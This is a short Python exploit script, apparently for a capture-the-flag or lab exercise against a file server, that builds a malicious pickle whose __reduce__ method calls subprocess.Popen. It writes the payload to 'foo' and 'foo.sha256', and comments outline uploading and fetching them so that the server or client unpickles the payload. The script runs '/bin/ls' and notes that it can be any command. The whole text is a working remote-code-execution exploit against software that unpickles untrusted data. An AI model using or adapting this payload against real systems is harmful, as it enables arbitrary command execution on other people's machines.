import subprocess
import pickle

def _0wn(args):
	class RCE(object):
		def __reduce__(self):
			return (subprocess.Popen, (args,))
	return pickle.dumps(RCE())

h4x = _0wn(['/bin/ls']) # Can be any command

with open('foo', 'wb') as f:
	f.write(h4x)
with open('foo.sha256', 'wb') as f:
	f.write(h4x)

# Run server
# Run client
# put foo N
# put foo.sha256 N
# get foo N